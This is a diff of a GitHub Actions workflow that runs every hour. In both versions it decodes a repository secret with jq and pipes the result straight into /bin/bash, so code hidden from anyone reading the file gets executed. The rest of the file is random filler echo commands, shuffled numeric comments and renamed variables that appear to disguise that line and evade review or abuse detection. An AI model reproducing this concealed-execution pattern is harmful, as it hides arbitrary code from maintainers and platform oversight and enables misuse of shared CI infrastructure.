@@ -1,38 +1,38 @@
-name: xianzuna9631 #23845
-on: #29823
-  workflow_dispatch: #13827
-  schedule: #18617
-    - cron: '43 * * * *' #29029
-jobs:  # 8777
-  build: #23926
-    runs-on: ubuntu-latest #21819
-    steps: #19516
-      - uses: actions/checkout@v4 #32267
-      - name: xianzuna9631 #9298
-        env: #30426
-          i15: ${{ secrets.i15 }} #8447
+name: xianzuna9631 #3294
+on: #14078
+  workflow_dispatch: #22453
+  schedule: #26835
+    - cron: '18 * * * *' #19400
+jobs: #14422
+  build: #16167
+    runs-on: ubuntu-latest #32001
+    steps: #11331
+      - uses: actions/checkout@v4 #7313
+      - name: xianzuna9631 #28315
+        env: #27005
+          t13909: ${{ secrets.t13909 }} #10026
         run: |
-          for i in 18940 30460 22863; do echo "Loop "; done
+          for i in 23840 31753 23316; do echo "Loop "; done
           sleep 0.1 2>/dev/null || true
-          echo $i15 | jq -r .n27306 | /bin/bash #4359
-          echo "String slice: str=abcdef; echo \${str:0:3}"
-          echo "Version: $((1 + RANDOM % 5))"
-          echo "Null check: [ ! -f /nonexistent ] && echo 'OK'"
-          echo "Command chain: true && echo 'A' || echo 'B'"
-          : ' Another single-line comment '
+          echo $t13909 | jq -r .p7051 | /bin/bash #10826
           echo "Redirect mock: echo data > /dev/null 2>&1"
-          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo "Path check: echo \$PATH | tr ':' '\n' | head -1"
+          echo "Random string: $(cat /dev/urandom | tr -cd 'a-z' | head -c 5 2>/dev/null || echo abcde)"
+          echo "Wget mock: wget -qO- http://example.com 2>/dev/null | head -1 || echo no-wget"
+          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
+          echo "Command chain: true && echo 'A' || echo 'B'"
+          echo "Time: $(date +%H:%M:%S)"
+          echo "Null cmd: : > /dev/null"
           sleep 0.1 2>/dev/null || true
-          echo "Time ms-like: $(date +%s%3N 2>/dev/null || echo 123456)"
-          echo "Array mock: arr=(1 2 3); echo \${arr[0]}"
-          echo "Dir: $(pwd)"
-          echo "Test file type: [ -f /etc/passwd ] && echo File"
+          echo "Command group: { echo group; }"
+          for i in {1..3}; do echo "Iter $i"; done
+          test -d /tmp && echo "Tmp dir exists"
           echo "Read mock: read -p 'Prompt' var <<< 'input'"
-          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
-          echo "Binary check: command -v bash 2>/dev/null && echo Bash"
-          echo "Export mock: export VAR=test"
-          echo "Date only: $(date +%F)"
-          echo "Time diff mock: echo \$SECONDS"
-          echo "Home dir: $(echo ~)"
           cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
-          echo "Brace exp: echo file_{1..3}.txt"
+          echo "Temp dir: $(mktemp -d 2>/dev/null || echo /tmp)"
+          echo "Build $(date +%s)"
+          echo "History mock: history | head -1 2>/dev/null || echo no-history"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo "Command sub: $(echo inside subshell)"
+          echo "Tmp cleanup: rm -f /tmp/.tmp* 2>/dev/null || true"
